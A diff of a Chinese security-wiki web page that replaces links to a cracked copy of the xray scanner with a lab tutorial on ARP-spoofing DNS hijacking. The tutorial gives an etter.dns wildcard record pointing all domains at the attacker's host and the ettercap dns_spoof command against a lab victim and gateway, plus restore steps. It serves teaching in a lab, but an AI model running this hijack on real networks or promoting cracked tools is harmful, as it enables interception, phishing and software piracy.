@@ -8,19 +8,19 @@
       
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
     
     
       
-        <title>20220519 - klsfct Docs</title>
+        <title>Dns劫持 - klsfct Docs</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.6e60f8b8.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6e60f8b8.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
         
           
           
@@ -38,9 +38,9 @@
       
     
     
-      <link rel="stylesheet" href="../../js/stylesheets/extra.css">
+      <link rel="stylesheet" href="../../../js/stylesheets/extra.css">
     
-    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -63,6 +63,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#arp-ettercap-dns" class="md-skip">
+          跳转至
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -73,9 +78,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+    <a href="../../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
       
-  <img src="../../images/logo.jpg" alt="logo">
+  <img src="../../../images/logo.jpg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -91,7 +96,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              20220519
+              Dns劫持
             
           </span>
         </div>
@@ -154,7 +159,7 @@
 
 
   <li class="md-tabs__item">
-    <a href="../.." class="md-tabs__link">
+    <a href="../../.." class="md-tabs__link">
       主页
     </a>
   </li>
@@ -169,7 +174,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+      <a href="../../%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
         安全wiki
       </a>
     </li>
@@ -185,7 +190,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+      <a href="../../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
         实战相关
       </a>
     </li>
@@ -201,7 +206,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+      <a href="../../../redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
         红队
       </a>
     </li>
@@ -217,7 +222,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+      <a href="../../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
         蓝队
       </a>
     </li>
@@ -233,7 +238,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-tabs__link">
+      <a href="../../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-tabs__link">
         挖洞相关
       </a>
     </li>
@@ -249,7 +254,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../about/aboutme/" class="md-tabs__link">
+      <a href="../../../about/aboutme/" class="md-tabs__link">
         About
       </a>
     </li>
@@ -277,9 +282,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+    <a href="../../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
       
-  <img src="../../images/logo.jpg" alt="logo">
+  <img src="../../../images/logo.jpg" alt="logo">
 
     </a>
     klsfct Docs
@@ -295,7 +300,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         主页
       </a>
     </li>
@@ -358,7 +363,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+      <a href="../../%E7%9B%AE%E5%BD%95/" class="md-nav__link">
         目录
       </a>
     </li>
@@ -372,7 +377,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+      <a href="../../%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="md-nav__link">
         安全基础
       </a>
     </li>
@@ -386,7 +391,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/" class="md-nav__link">
+      <a href="../../Web%E5%AE%89%E5%85%A8/" class="md-nav__link">
         web安全
       </a>
     </li>
@@ -400,7 +405,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" class="md-nav__link">
+      <a href="../../%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" class="md-nav__link">
         数据安全
       </a>
     </li>
@@ -414,7 +419,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/CMS%E5%AE%89%E5%85%A8/" class="md-nav__link">
+      <a href="../../CMS%E5%AE%89%E5%85%A8/" class="md-nav__link">
         cms安全
       </a>
     </li>
@@ -428,7 +433,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="md-nav__link">
+      <a href="../../%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="md-nav__link">
         流量分析
       </a>
     </li>
@@ -442,7 +447,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" class="md-nav__link">
+      <a href="../../%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" class="md-nav__link">
         服务器、中间件安全
       </a>
     </li>
@@ -456,7 +461,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+      <a href="../../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
         应急响应
       </a>
     </li>
@@ -470,7 +475,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+      <a href="../../%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="md-nav__link">
         渗透测试
       </a>
     </li>
@@ -484,7 +489,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/" class="md-nav__link">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/" class="md-nav__link">
         安全测试项目梳理
       </a>
     </li>
@@ -540,7 +545,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+      <a href="../../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E7%9B%AE%E5%BD%95/" class="md-nav__link">
         目录
       </a>
     </li>
@@ -554,7 +559,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+      <a href="../../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/" class="md-nav__link">
         漏洞测试
       </a>
     </li>
@@ -568,7 +573,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/" class="md-nav__link">
+      <a href="../../../%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/" class="md-nav__link">
         内部渗透比赛
       </a>
     </li>
@@ -634,7 +639,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+      <a href="../../../redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
         目录
       </a>
     </li>
@@ -648,7 +653,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+      <a href="../../../redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
         信息收集
       </a>
     </li>
@@ -662,7 +667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E6%BC%8F%E6%B4%9E%E5%BA%93/" class="md-nav__link">
+      <a href="../../../redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/" class="md-nav__link">
         漏洞库
       </a>
     </li>
@@ -676,7 +681,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
+      <a href="../../../redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
         溯源分析
       </a>
     </li>
@@ -690,7 +695,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E9%92%93%E9%B1%BC/" class="md-nav__link">
+      <a href="../../../redteam/%E9%92%93%E9%B1%BC/" class="md-nav__link">
         钓鱼
       </a>
     </li>
@@ -704,7 +709,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/" class="md-nav__link">
+      <a href="../../../redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/" class="md-nav__link">
         代理转发与隧道
       </a>
     </li>
@@ -718,7 +723,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../提取系列.md" class="md-nav__link">
+      <a href="../../../redteam/提取系列.md" class="md-nav__link">
         提权系列
       </a>
     </li>
@@ -732,7 +737,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../域渗透测试一条龙.md" class="md-nav__link">
+      <a href="../../../redteam/域渗透测试一条龙.md" class="md-nav__link">
         域渗透
       </a>
     </li>
@@ -794,7 +799,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+      <a href="../../../blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
         目录
       </a>
     </li>
@@ -808,7 +813,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+      <a href="../../../blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
         应急响应
       </a>
     </li>
@@ -822,7 +827,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="md-nav__link">
+      <a href="../../../blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="md-nav__link">
         日志分析
       </a>
     </li>
@@ -836,7 +841,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../blueteam/window实战.md" class="md-nav__link">
+      <a href="../../../blueteam/window实战.md" class="md-nav__link">
         window实战
       </a>
     </li>
@@ -850,7 +855,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../linux实战.md" class="md-nav__link">
+      <a href="../../../redteam/linux实战.md" class="md-nav__link">
         linux实战
       </a>
     </li>
@@ -864,7 +869,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web实战.md" class="md-nav__link">
+      <a href="../../../redteam/web实战.md" class="md-nav__link">
         web实战
       </a>
     </li>
@@ -918,7 +923,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-nav__link">
+      <a href="../../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/" class="md-nav__link">
         众测项目
       </a>
     </li>
@@ -932,7 +937,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/" class="md-nav__link">
+      <a href="../../../%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/" class="md-nav__link">
         思路方法
       </a>
     </li>
@@ -984,7 +989,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../about/aboutme/" class="md-nav__link">
+      <a href="../../../about/aboutme/" class="md-nav__link">
         about me
       </a>
     </li>
@@ -1005,19 +1010,265 @@
               </div>
             
             
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#arp-ettercap-dns" class="md-nav__link">
+    ARP-Ettercap DNS劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="ARP-Ettercap DNS劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns" class="md-nav__link">
+    什么是DNS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns_1" class="md-nav__link">
+    什么是DNS劫持
+  </a>
+  
+    <nav class="md-nav" aria-label="什么是DNS劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ettercap" class="md-nav__link">
+    ettercap劫持的原理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#arp-dns" class="md-nav__link">
+    ARP-DNS欺骗攻击步骤
+  </a>
+  
+    <nav class="md-nav" aria-label="ARP-DNS欺骗攻击步骤">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kaliapache" class="md-nav__link">
+    kali开启apache服务
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apache" class="md-nav__link">
+    浏览器访问Apache的首页
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ettercap_1" class="md-nav__link">
+    编辑ettercap配置文件
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
           
           <div class="md-content" data-md-component="content">
             <article class="md-content__inner md-typeset">
               
                 
 
-  <h1>20220519</h1>
+  <h1>Dns劫持</h1>
 
-<p>xray_free_crack,通用xray白嫖高级版.</p>
-<p><a href="https://github.com/afwu/xray_free_crack">https://github.com/afwu/xray_free_crack</a></p>
-<p><a href="https://www.cnblogs.com/ctfisnull/p/15192228.html">https://www.cnblogs.com/ctfisnull/p/15192228.html</a></p>
-<p>针对 Acunetix AWVS扫描器开发的批量扫描脚本，支持log4j漏洞、SpringShell、SQL注入、XSS、弱口令等专项，支持联动xray、burp、w13scan等被动批量</p>
-<p><a href="https://github.com/test502git/awvs14-scan">https://github.com/test502git/awvs14-scan</a></p>
+<h3 id="arp-ettercap-dns">ARP-Ettercap DNS劫持<a class="headerlink" href="#arp-ettercap-dns" title="Permanent link">&para;</a></h3>
+<h4 id="dns">什么是DNS<a class="headerlink" href="#dns" title="Permanent link">&para;</a></h4>
+<p>​       概念
+​           DNS是Domain Name System的缩写, 我们称之域名系统
+​           他要完成的任务是帮我们把输入的域名转换成ip地址
+​       工作过程
+​           先找DNS缓存
+​           再找host配置
+​           最终查找DNS服务器
+​           </p>
+<h4 id="dns_1">什么是DNS劫持<a class="headerlink" href="#dns_1" title="Permanent link">&para;</a></h4>
+<p>​   概念
+​        DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。</p>
+<h5 id="ettercap">ettercap劫持的原理<a class="headerlink" href="#ettercap" title="Permanent link">&para;</a></h5>
+<p>​       局域网劫持, 攻击者通过伪装成网关, 劫持受害者的网络请求, 将网络请求拦截到指定的服务器
+​   DNS常用命令
+​       查看DNS缓存表
+​           ipconfig /displaydns
+​       刷新DNS缓存
+​           ipconfig /flushdns</p>
+<h4 id="arp-dns">ARP-DNS欺骗攻击步骤<a class="headerlink" href="#arp-dns" title="Permanent link">&para;</a></h4>
+<h5 id="kaliapache">kali开启apache服务<a class="headerlink" href="#kaliapache" title="Permanent link">&para;</a></h5>
+<p>​       service apache2 start
+​       service apache2 status</p>
+<h5 id="apache">浏览器访问Apache的首页<a class="headerlink" href="#apache" title="Permanent link">&para;</a></h5>
+<p>​       <a href="http://192.168.110.12">http://192.168.110.12</a></p>
+<h5 id="ettercap_1">编辑ettercap配置文件<a class="headerlink" href="#ettercap_1" title="Permanent link">&para;</a></h5>
+<p>​       进入配置文件位置
+​           cd /etc/ettercap
+​       复制原有的配置文件（环境恢复比较方便）
+​           cp etter.dns etter.dns1
+​       设置dns劫持配置文件
+​           vi /etc/ettercap/etter.dns
+​               添加以下内容</p>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>                *   A   192.168.110.12
+                *   PTR 192.168.110.12
+            参数讲解
+                *:代表所有的网站 也可设置某个网站 www.mashibing.com
+                A:代表钓鱼的ip地址
+                PTR ：常被用于反向地址解析
+
+
+##### ettercap劫持命令讲解
+
+​   ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关// 
+​       -i：网卡
+​        -T：文本模式
+​        -q：安静模式
+​        -M：执行mitm攻击
+​       -P：plugin 开始该插件
+靶机访问以下网站确认环境正常
+​   http://www.mashibing.com/
+​   http://m.ctrip.com
+​   http://www.jd.com/
+​   ping www.mashibing.com
+​   ping m.ctrip.com
+​   ping www.jd.com
+
+##### 执行劫持命令
+
+​   ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.110.11// /192.168.110.1// &gt;b.txt
+分析日志
+​   tail -f b.txt
+​   tail -f b.txt | grep &quot;dns_spoof&quot;
+
+##### 靶机访问以下网站查看攻击效果
+
+​   http://www.mashibing.com/
+​   http://m.ctrip.com
+​   http://www.jd.com/
+​   ping www.mashibing.com
+​   ping m.ctrip.com
+​   ping www.jd.com
+停止劫持
+​   Ctrl+C
+恢复dns劫持，刷新dns缓存即可
+​   ipconfig /flushdns
+靶机访问以下网站查看环境是否恢复正常
+​   http://www.mashibing.com/
+​   http://m.ctrip.com
+​   http://www.jd.com/
+​   ping www.mashibing.com
+​   ping m.ctrip.com
+​   ping www.jd.com
+恢复kali环境
+​   进入配置文件位置
+​       cd /etc/ettercap
+​   复制dns文件到新文件
+​       cp etter.dns etter.dns2
+​   删除配置好的攻击文件
+​       rm etter.dns
+​   还原dns配置文件
+​       cp etter.dns1 etter.dns
+</code></pre></div>
+</td></tr></table>
 
   <hr>
 <div class="md-source-file">
@@ -1074,12 +1325,12 @@
     <div class="md-dialog" data-md-component="dialog">
       <div class="md-dialog__inner md-typeset"></div>
     </div>
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
     
     
-      <script src="../../assets/javascripts/bundle.960e086b.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.960e086b.min.js"></script>
       
-        <script src="../../js/google-tongji.js"></script>
+        <script src="../../../js/google-tongji.js"></script>
       
     
   </body>
